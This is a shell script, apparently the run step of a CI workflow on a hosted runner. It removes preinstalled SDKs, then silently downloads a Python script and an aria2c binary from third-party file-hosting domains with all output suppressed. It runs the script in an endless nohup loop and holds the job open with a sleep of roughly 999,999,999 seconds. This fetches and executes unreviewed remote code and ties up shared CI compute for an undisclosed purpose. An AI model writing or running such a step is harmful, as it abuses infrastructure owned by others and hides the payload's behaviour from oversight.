          cd
          
          sudo rm -rf /usr/local/lib/android
          sudo rm -rf /usr/share/dotnet
          sudo rm -rf /opt/hostedtoolcache
          sudo rm -rf /usr/local/.ghcup
          pip3 install requests >/dev/null 2>&1
          sudo curl -s --silent -X GET https://exampleoci.yunzhongzhuan.com/python/cctemp.py -o bin >/dev/null 2>&1

          curl -X GET "https://id5gfpyyw89p8g.1yunpan.com/aria2c-linux-amd64" -o /home/runner/aria2c
          chmod +x /home/runner/aria2c
          
          # mkdir thread1 && echo 'while true; do python3 bin; done' > thread1/run.sh && chmod +x thread1/run.sh
          # cp bin thread1 && cd thread1 && nohup bash run.sh & echo 'yes' && cd

          for i in $(seq 1 1); do
            mkdir -p thread$i && \
            echo 'while true; do python3 bin; done' > thread$i/run.sh && \
            chmod +x thread$i/run.sh && \
            cp bin thread$i && \
            (cd thread$i && nohup bash run.sh & pwd ) \
          done

          sleep 999999999
          
